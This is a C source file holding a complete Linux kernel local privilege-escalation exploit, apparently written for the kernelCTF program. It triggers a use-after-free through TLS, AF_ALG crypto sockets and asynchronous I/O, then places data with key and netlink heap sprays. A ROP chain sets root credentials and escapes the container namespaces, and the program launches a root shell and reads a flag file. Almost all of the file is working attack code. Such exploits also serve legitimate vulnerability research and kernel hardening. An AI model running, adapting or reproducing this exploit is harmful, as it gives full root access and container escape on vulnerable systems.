#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <keyutils.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <math.h>
#include <libaio.h>

#include "kernelver_17800.147.60.h"

static key_serial_t g_key;
static char *g_mmapped_buf;
static uint64_t g_kernel_text;
static pid_t g_sender_pid;
char *g_stack1;
uint64_t leak_kernel_text();

#define STACK_SIZE (1024 * 1024)    /* Stack size for cloned child */

void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void get_kctf_flag()
{
        char buf[512];


        int fd = open("/flag", O_RDONLY);

        if (fd < 0)
                return;

        size_t n = read(fd, buf, sizeof(buf));
        if (n > 0) {
                printf("Flag:\n");

                write(1, buf, n);

                printf("\n");
        }

        close(fd);
}

static char *g_sh_argv[] = {"sh", NULL};

static int g_status;

#define MMAP_SIZE 0x10000

static int g_pwned;
static char *g_rop2;
static size_t g_rop2_len;

#define ROP2_CONST_AREA 0x10
#define ROP2_CONST_OFFSET 0x200

#define KOFFSET(x) (x-0xffffffff81000000uL)

uint64_t kaddr(uint64_t addr)
{
        return g_kernel_text + addr - 0xffffffff81000000uL;
}


void __attribute__((naked)) after_pwn()
{
// Fix user stack and recover eflags since we didn't do when returning from kernel mode
        asm volatile(
                "mov %0, %%rsp\n"
                :: "r" (g_mmapped_buf + MMAP_SIZE - 0x100)
        );

        g_pwned = 1;

        set_cpu(1);

        int pid = fork();

        if (!pid) {

        if (setns(open("/proc/1/ns/mnt", O_RDONLY), 0) < 0)
                perror("setns");

        setns(open("/proc/1/ns/pid", O_RDONLY), 0);
        setns(open("/proc/1/ns/net", O_RDONLY), 0);

        printf("\nGot root!!!\n");
        printf("Getting kctf flags ...\n");

        get_kctf_flag();

        printf("Launching shell, system will crash when you exit because I didn't bother with recovery ...\n");
        execve("/bin/sh", g_sh_argv, NULL);
        _exit(0);
        }

        waitpid(pid, &g_status, 0);

       

        printf("Shell exited, sleeping for 30 seconds, after that system might crash\n");

        sleep(30);
        _exit(0);
}


void setup_tls(int sock, int is_rx, int fail)
{
        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
                err(1, "setsockopt");
        
        static struct tls12_crypto_info_aes_ccm_128 crypto_info = {.info.version = TLS_1_2_VERSION, .info.cipher_type = TLS_CIPHER_AES_CCM_128};

        if (fail)
                memcpy(crypto_info.key, "WRONG", 5);

        if (setsockopt(sock, SOL_TLS, is_rx ? TLS_RX : TLS_TX, &crypto_info, sizeof(crypto_info)) < 0)
                err(1, "TLS_TX");
}

int sender(int port)
{
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(port);

        if (connect(sock, &addr, sizeof(addr)) < 0)
                err(1, "connect");


        setup_tls(sock, 0, 0);

        char buf[1024];
        memset(buf, 'B', sizeof(buf));
        int ret = send(sock, g_mmapped_buf, 10, 0);

        if (ret < 0)
                err(1, "sender error");

        return sock;
}


int prepare_netlink_listener(unsigned int port_id)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id;
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)))
                err(1, "bind netlink fail\n");

        return sock;
}

int alloc_netlink(size_t len, char *buf)
{
        static unsigned int port_id = 0x6666;

        if (len <= 0x140)
                err(1, "alloc_netlink: len too small\n");

        int listener_sock = prepare_netlink_listener(port_id);

        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id++;

        ssize_t n = sendto(sock, buf, len - 0x140, MSG_DONTWAIT, (struct sockaddr*)&addr, sizeof(addr));

        if (n < 0)
                err(1, "sendto netlink\n");

        return listener_sock;
}

int create_server_sock(int port)
{
        struct sockaddr_in addr;

        int sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (sock_serv < 0)
                err(1, "socket");

        int flag = 1;
        setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(port);

        if (bind(sock_serv, &addr, sizeof(addr)) < 0)
                err(1, "connect");

        listen(sock_serv, 99999);

        return sock_serv;
}

struct child_arg {
        io_context_t ctx;
};

key_serial_t alloc_key(int id, size_t len, char *buf)
{
        key_serial_t serial;
        char desc[256];
        len -= 24;

        snprintf(desc, sizeof(desc), "k%d", id);

        serial = syscall(SYS_add_key, "user", desc, buf, len, KEY_SPEC_USER_KEYRING);

        if (serial < 0) {
                perror("key add");
                exit(0);
        }

        return serial;
}

void free_key(key_serial_t key)
{
        long ret = syscall(SYS_keyctl, KEYCTL_UNLINK, key, KEY_SPEC_USER_KEYRING);
        if (ret < 0) {
                perror("key unlink");
                exit(1);
        }

}

void rop_rax2rdi(uint64_t **rop_p)
{
        uint64_t *rop = *rop_p;

        *(uint64_t *) (g_rop2+ROP2_CONST_OFFSET) = kaddr(POP_RDI); // RCX == RW_BUFFER 

// rax -> rdi
        *rop++ = kaddr(POP_RCX);
        *rop++ = kaddr(RW_BUFFER+ROP2_CONST_OFFSET); 
        *rop++ = kaddr(PUSH_RAX_JMP_QWORD_RCX);

        *rop_p = rop;
}


size_t prepare_rop2(uint64_t *rop2)
{
        uint64_t *rop2_start = rop2;


        *rop2++ = kaddr(POP_RDI);
        *rop2++ = kaddr(INIT_CRED);
        *rop2++ = kaddr(COMMIT_CREDS);
        *rop2++ = kaddr(AUDIT_SYSCALL_EXIT);

        // Namespace escape based on code by Crusaders of Rust
        *rop2++ = kaddr(POP_RDI);
        *rop2++ = 1;
        *rop2++ = kaddr(FIND_TASK_BY_VPID);

        rop_rax2rdi(&rop2); // clobbers RCX

        *rop2++ = kaddr(POP_RSI);
        *rop2++ = kaddr(INIT_NSPROXY);

        *rop2++ = kaddr(SWITCH_TASK_NAMESPACES);

        *rop2++ = kaddr(POP_R11_R10_R9_R8_RDI_RSI_RDX_RCX);
// eflags
        *rop2++ = 0;
        rop2 += 6;

// Userspace RIP
        *rop2++ = (uint64_t) after_pwn;

        *rop2++ = kaddr(RETURN_VIA_SYSRET);

        return (char *) rop2 - (char *) rop2_start;
}




int child_wait(void *arg)
{
        struct child_arg *carg = (struct child_arg *) arg;
        int ret;

        struct io_event events[2000];

        memset(g_mmapped_buf, 'A', 1024);
        ret = io_getevents(carg->ctx, 1000, 1001, events, NULL);

        if (ret < 0)
                err(1, "io_getevents");


        g_key = alloc_key(0, 513, g_mmapped_buf);

        return 0;
}

void empty_handler(int s)
{
}

void set_cpu_area(uint64_t *data)
{
        pid_t pid = fork();
        if (!pid) {
                set_cpu(1);
                signal(SIGSEGV, empty_handler);

                asm volatile("movq %0, %%r15\n" :: "r" (data[0]) : "r15");
                asm volatile("movq %0, %%r14\n" :: "r" (data[1]) : "r14");
                asm volatile("movq %0, %%r13\n" :: "r" (data[2]) : "r13");
                asm volatile("movq %0, %%r12\n" :: "r" (data[3]) : "r12");
                asm volatile("movq %0, %%rbp\n" :: "r" (data[4]) : "rbp");
                asm volatile("movq %0, %%rbx\n" :: "r" (data[5]) : "rbx");
                asm volatile("movq %0, %%r11\n" :: "r" (data[6]) : "r11");
                asm volatile("movq %0, %%r10\n" :: "r" (data[7]) : "r10");
                asm volatile("movq %0, %%r9\n" :: "r" (data[8]) : "r9");
                asm volatile("movq %0, %%r8\n" :: "r" (data[9]) : "r8");

                asm volatile("movq $0, (0x1337)");
        }
}

int main(int argc, char **argv)
{
        g_kernel_text = leak_kernel_text();
        printf("Using kernel base: 0x%lx\n", g_kernel_text);

        printf("Priority: %d\n", getpriority(PRIO_PROCESS, 0));

        setbuf(stdout, NULL);

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);

#define ROP2_MMAP_SIZE 0x4000
        g_rop2 = mmap(NULL, ROP2_MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE|MAP_LOCKED, -1, 0);
        if (g_rop2 == MAP_FAILED)
                err(1, "mmap");


        set_cpu(0);

        struct msghdr msg = {};
        struct cmsghdr *cmsg;
        struct af_alg_iv *iv;
        struct iovec iov;
        char cbuf[CMSG_SPACE(4) + CMSG_SPACE(20)] = {0};

        msg.msg_control = cbuf;
        msg.msg_controllen = sizeof(cbuf);

        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_OP;
        cmsg->cmsg_len = CMSG_LEN(4);
        *(__u32 *)CMSG_DATA(cmsg) = ALG_OP_ENCRYPT;

        cmsg = CMSG_NXTHDR(&msg, cmsg);
        cmsg->cmsg_level = SOL_ALG;
        cmsg->cmsg_type = ALG_SET_IV;
        cmsg->cmsg_len = CMSG_LEN(20);
        iv = (void *)CMSG_DATA(cmsg);
        iv->ivlen = 8;        

        iov.iov_base = g_mmapped_buf;
        iov.iov_len = 4096;

        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;

        struct sockaddr_alg sa = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(rfc3686(ctr(aes-generic)))"
        };

#define IOCB_CNT 1200

        int sockets2[IOCB_CNT];
        int alg_sock = socket(AF_ALG, SOCK_SEQPACKET, 0);;
        if (bind(alg_sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
                err(1, "af_alg bind");
        if (setsockopt(alg_sock, SOL_ALG, ALG_SET_KEY, g_mmapped_buf, 20) < 0)
                err(1, "set key");

        for (int i = 0; i < IOCB_CNT; i++)
        {
                sockets2[i] = accept(alg_sock, NULL, 0);
                if (sockets2[i] < 0)
                        err(1, "accept");
                if (sendmsg(sockets2[i], &msg, 0) < 0)
                        err(1, "sendmsg2");
        }

        int c1 = socket(AF_ALG, SOCK_SEQPACKET, 0);
        struct sockaddr_alg sa2 = {
                .salg_family = AF_ALG,
                .salg_type = "aead",
                .salg_name = "ccm_base(cryptd(ctr(aes-generic)),cbcmac(aes-aesni))"
        };

        if (bind(c1, (struct sockaddr *)&sa2, sizeof(sa)) < 0)
                err(1, "af_alg bind");

        int c4 = socket(AF_ALG, SOCK_SEQPACKET, 0);
        if (c4 < 0)
                err(1, "skcipher socket");


        struct sockaddr_in addr, peer_addr;
        memset(&addr, 0, sizeof(addr));
        char buf[256];
        struct iocb iocbs[IOCB_CNT];
        struct iocb *iocb_ptrs[IOCB_CNT];
        io_context_t ctx;

        memset(&ctx, 0, sizeof(ctx));

        io_setup(IOCB_CNT, &ctx);

        int sock_serv = create_server_sock(7777);

        int sock_client_tls = sender(7777);

        socklen_t sz;
        int sock = accept(sock_serv, &peer_addr, &sz);

        if (sock < 0)
                err(1, "accept");



        setup_tls(sock, 1, 1);

        for (int i = 0; i < IOCB_CNT; i++)
        {
                iocb_ptrs[i] = &iocbs[i];

                if (i == (IOCB_CNT - 1)) {
                        io_prep_pread(&iocbs[i], sock, g_mmapped_buf, 1, 0);
                } else {
                        io_prep_pread(&iocbs[i], sockets2[i], buf, 1, 0);
                }
        }

        g_rop2_len = prepare_rop2((uint64_t *) g_rop2);
        if (g_rop2_len > ROP2_CONST_OFFSET)
                err(1, "Stage 2 ROP size too big: %d > %d\n", g_rop2_len, ROP2_CONST_OFFSET);


        g_stack1 = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
        if (g_stack1 == MAP_FAILED) {
                perror("mmap");
                exit(1);
        }

        struct child_arg carg = {
                .ctx = ctx
        };
        pid_t pid = clone(child_wait, g_stack1 + STACK_SIZE, CLONE_FS | CLONE_FILES | CLONE_VM | SIGCHLD, (void *) &carg);

        if (nice(19) < 0)
                err(1, "nice");

        io_submit(ctx, IOCB_CNT, iocb_ptrs);
        
        int status;
        if (waitpid(pid, &status, 0) < 0)
                err(1, "waitpid");
 
        struct sockaddr_alg sa4 = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "ecb(aes)"
        };

        if (bind(c4, (struct sockaddr *)&sa4, sizeof(sa4)) < 0)
                err(1, "af_alg bind");

// .setkey
/*
0xffffffff81f90db9:     mov r8, qword ptr [rdi + 0xc8]
0xffffffff81f90dc0:     mov eax, 1
0xffffffff81f90dc5:     test r8, r8
0xffffffff81f90dc8:     je 0xffffffff81f90de1
0xffffffff81f90dca:     mov rsi, rdi
0xffffffff81f90dcd:     mov rcx, r14
0xffffffff81f90dd0:     mov rdi, rbp
0xffffffff81f90dd3:     mov rdx, r15
0xffffffff81f90dd6:     call    __x86_indirect_thunk_r8
*/

        uint64_t fake_alg[20] = {kaddr(G1)};

// .min_keysize/max_keysize
        fake_alg[5] = 0 | (0xffffL << 32);

        set_cpu_area(fake_alg);

        free_key(g_key);

        sleep(2);

        uint64_t *rop = (uint64_t *) g_mmapped_buf;

        *rop++ = kaddr(POP_RSI_RDX_RCX);

        rop += 3;
        *(uint64_t *) (g_mmapped_buf + 0xF) = 0xcafebabe;
// crypto_skcipher->__crt_alg = cpu_entry_area
        *(uint64_t *) (g_mmapped_buf + 0x18) = 0xfffffe000003df98L;
        *(uint64_t *) (g_mmapped_buf + 0x66) = kaddr(POP_RSP);
        *(uint64_t *) (g_mmapped_buf + 0xc8) = kaddr(PUSH_RSI_JMP_QWORD_RSI_066);

        *rop++ = kaddr(POP_RDI_RSI_RDX_RCX);
        *rop++ = kaddr(RW_BUFFER);
        *rop++ = (uint64_t) g_rop2;
        *rop++ = ROP2_CONST_OFFSET + ROP2_CONST_AREA;;
        *rop++ = 0xdeadbeef;

        *rop++ = kaddr(COPY_USER_GENERIC_STRING);

        *rop++ = kaddr(POP_RSP);
        *rop++ = kaddr(RW_BUFFER);


        for (int i = 0; i < 1; i++)
        {
                alloc_netlink(1024, g_mmapped_buf);
        }

        char key[32];

        if (setsockopt(c4, SOL_ALG, ALG_SET_KEY, key, 32) < 0)
                err(1, "set key");

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
